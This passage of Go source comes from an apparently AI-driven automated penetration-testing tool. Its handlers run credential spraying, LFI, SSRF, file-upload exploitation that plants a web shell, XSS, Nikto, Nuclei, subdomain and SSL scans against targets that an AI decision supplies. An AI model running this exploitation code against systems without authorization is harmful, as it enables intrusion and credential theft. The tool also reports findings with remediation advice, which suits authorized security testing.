	if username == "" || password == "" || service == "" {
		action.Result = "Credential spray requires username, password, and service"
		action.Success = false
		return action, nil
	}

	// Parse target
	target := decision.Target
	port := ""
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	var modulePath string
	switch service {
	case "ftp":
		modulePath = "auxiliary/scanner/ftp/ftp_login"
		if port == "" {
			port = "21"
		}
	case "mysql":
		modulePath = "auxiliary/scanner/mysql/mysql_login"
		if port == "" {
			port = "3306"
		}
	case "http":
		modulePath = "auxiliary/scanner/http/http_login"
		if port == "" {
			port = "80"
		}
	case "redis":
		modulePath = "auxiliary/scanner/redis/redis_login"
		if port == "" {
			port = "6379"
		}
	default:
		action.Result = fmt.Sprintf("Unsupported service for credential spray: %s", service)
		action.Success = false
		return action, nil
	}

	if err := r.framework.Use(modulePath); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	module.SetOption("USERNAME", username)
	module.SetOption("PASSWORD", password)
	module.SetOption("STOP_ON_SUCCESS", "true")

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Credential spray failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		// Add finding
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "credential_reuse",
			Severity:    "high",
			Target:      fmt.Sprintf("%s:%s", target, port),
			Service:     service,
			Description: fmt.Sprintf("Password reuse detected - %s credentials work on %s", username, service),
			Remediation: "Use unique passwords for each service, implement credential rotation",
			Timestamp:   time.Now(),
		})

		// Add credential
		cf := CredentialFind{
			Username: username,
			Password: password,
			Service:  service,
			Target:   fmt.Sprintf("%s:%s", target, port),
		}
		r.state.Credentials = append(r.state.Credentials, cf)

		if r.callbacks.OnCredential != nil {
			r.callbacks.OnCredential(cf)
		}

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "credential_reuse",
				Severity:    "high",
				Target:      fmt.Sprintf("%s:%s", target, port),
				Description: fmt.Sprintf("Credential reuse: %s works on %s", username, service),
			})
		}
	}

	action.Result = result.Output
	if action.Result == "" {
		if result.Success {
			action.Result = fmt.Sprintf("SUCCESS: %s:%s works on %s:%s", username, password, service, port)
		} else {
			action.Result = fmt.Sprintf("FAILED: %s credentials rejected by %s:%s", username, service, port)
		}
	}
	action.Success = result.Success
	action.Data["service"] = service
	action.Data["username"] = username

	return action, nil
}

// actionLFI tests for Local File Inclusion vulnerabilities
func (r *AutoRunner) actionLFI(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/lfi"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("LFI exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "local_file_inclusion",
			Severity:    "high",
			Target:      decision.Target,
			Description: "Local File Inclusion - Sensitive files readable",
			Evidence:    result.Output,
			Remediation: "Validate and sanitize file path inputs, use allowlists for includable files",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "local_file_inclusion",
				Severity:    "high",
				Target:      decision.Target,
				Description: "LFI vulnerability found",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSSRF tests for Server-Side Request Forgery vulnerabilities
func (r *AutoRunner) actionSSRF(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/ssrf"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSRF exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "ssrf",
			Severity:    "high",
			Target:      decision.Target,
			Description: "Server-Side Request Forgery - Internal services accessible",
			Evidence:    result.Output,
			Remediation: "Validate and sanitize URLs, implement allowlists, block internal IP ranges",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "ssrf",
				Severity:    "high",
				Target:      decision.Target,
				Description: "SSRF vulnerability found",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionFileUpload tests for insecure file upload vulnerabilities
func (r *AutoRunner) actionFileUpload(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/file_upload"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if uploadDir := getOpt(decision.Options, "uploaddir"); uploadDir != "" {
		module.SetOption("UPLOADDIR", uploadDir)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("File upload exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "file_upload_rce",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "Insecure File Upload - Web shell uploaded, RCE achieved",
			Evidence:    result.Output,
			Remediation: "Validate file types, use allowlists, store uploads outside webroot, rename files",
			Timestamp:   time.Now(),
		})

		// Add session for RCE
		r.state.Sessions = append(r.state.Sessions, SessionInfo{
			ID:     fmt.Sprintf("webshell-%d", len(r.state.Sessions)+1),
			Type:   "webshell",
			Target: decision.Target,
			User:   "www-data",
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "file_upload_rce",
				Severity:    "critical",
				Target:      decision.Target,
				Description: "File upload RCE achieved",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionNucleiScan runs Nuclei vulnerability scanner
func (r *AutoRunner) actionNucleiScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/nuclei"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"
	ssl := false

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		ssl = true
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	if ssl {
		module.SetOption("SSL", "true")
	}

	// Optional settings
	if templates := getOpt(decision.Options, "templates"); templates != "" {
		module.SetOption("TEMPLATES", templates)
	}
	if severity := getOpt(decision.Options, "severity"); severity != "" {
		module.SetOption("SEVERITY", severity)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Nuclei scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record findings from nuclei
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.NucleiFinding); ok {
			for _, f := range findings {
				severity := f.Info.Severity
				if severity == "" {
					severity = "info"
				}

				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "nuclei_" + f.TemplateID,
					Severity:    severity,
					Target:      f.MatchedAt,
					Description: f.Info.Name + ": " + f.Info.Description,
					Evidence:    f.TemplateID,
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "nuclei_" + f.TemplateID,
						Severity:    severity,
						Target:      f.MatchedAt,
						Description: f.Info.Name,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionXSSScan tests for XSS vulnerabilities
func (r *AutoRunner) actionXSSScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/xss"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}
	if method := getOpt(decision.Options, "method"); method != "" {
		module.SetOption("METHOD", method)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("XSS scan failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "xss_reflected",
			Severity:    "medium",
			Target:      decision.Target,
			Description: "Cross-Site Scripting (XSS) vulnerability detected",
			Evidence:    result.Output,
			Remediation: "Encode output, use Content-Security-Policy, validate input",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "xss_reflected",
				Severity:    "medium",
				Target:      decision.Target,
				Description: "XSS vulnerability found",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionNiktoScan runs Nikto web scanner
func (r *AutoRunner) actionNiktoScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/nikto"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	// Set shorter timeout for autopwn
	module.SetOption("MAXTIME", "60")

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Nikto scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record findings
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.NiktoFinding); ok {
			for _, f := range findings {
				severity := "info"
				desc := strings.ToLower(f.Description)
				if strings.Contains(desc, "vulnerab") || strings.Contains(desc, "exploit") {
					severity = "high"
				} else if strings.Contains(desc, "config") || strings.Contains(desc, "header") {
					severity = "medium"
				}

				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "nikto_" + f.Reference,
					Severity:    severity,
					Target:      decision.Target,
					Description: f.Description,
					Evidence:    fmt.Sprintf("%s %s", f.Method, f.URI),
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "nikto_finding",
						Severity:    severity,
						Target:      decision.Target,
						Description: f.Description,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSubdomainEnum enumerates subdomains using subfinder
func (r *AutoRunner) actionSubdomainEnum(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/gather/subdomain_enum"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Get domain from target
	domain := decision.Target

	// Strip protocol if present
	domain = strings.TrimPrefix(domain, "http://")
	domain = strings.TrimPrefix(domain, "https://")

	// Strip port if present
	if idx := strings.Index(domain, ":"); idx != -1 {
		domain = domain[:idx]
	}

	// Strip path if present
	if idx := strings.Index(domain, "/"); idx != -1 {
		domain = domain[:idx]
	}

	module.SetOption("DOMAIN", domain)

	if timeout := getOpt(decision.Options, "timeout"); timeout != "" {
		module.SetOption("TIMEOUT", timeout)
	}
	if threads := getOpt(decision.Options, "threads"); threads != "" {
		module.SetOption("THREADS", threads)
	}
	if recursive := getOpt(decision.Options, "recursive"); recursive != "" {
		module.SetOption("RECURSIVE", recursive)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Subdomain enumeration failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record subdomains as potential hosts
	if result.Success {
		if subdomains, ok := result.Data["subdomains"].([]string); ok {
			for _, subdomain := range subdomains {
				r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
					Hostname: subdomain,
					Status:   "discovered",
				})
			}

			// Add finding for discovered subdomains
			r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
				Type:        "subdomain_discovery",
				Severity:    "info",
				Target:      domain,
				Description: fmt.Sprintf("Discovered %d subdomains", len(subdomains)),
				Evidence:    strings.Join(subdomains, "\n"),
				Timestamp:   time.Now(),
			})

			if r.callbacks.OnFinding != nil {
				r.callbacks.OnFinding(Finding{
					Type:        "subdomain_discovery",
					Severity:    "info",
					Target:      domain,
					Description: fmt.Sprintf("Found %d subdomains for %s", len(subdomains), domain),
				})
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSSLScan analyzes SSL/TLS configuration
func (r *AutoRunner) actionSSLScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ssl"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target
	target := decision.Target
	port := "443"

	// Strip protocol if present
	target = strings.TrimPrefix(target, "https://")
	target = strings.TrimPrefix(target, "http://")

	// Strip path if present
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}

	// Extract port if present
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if timeout := getOpt(decision.Options, "timeout"); timeout != "" {
		module.SetOption("TIMEOUT", timeout)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSL scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record SSL findings
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.SSLFinding); ok {
			for _, f := range findings {
				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "ssl_" + f.Type,
					Severity:    f.Severity,
					Target:      fmt.Sprintf("%s:%s", target, port),
					Description: f.Description,
					Evidence:    f.Details,
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "ssl_" + f.Type,
						Severity:    f.Severity,
						Target:      fmt.Sprintf("%s:%s", target, port),
						Description: f.Description,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}
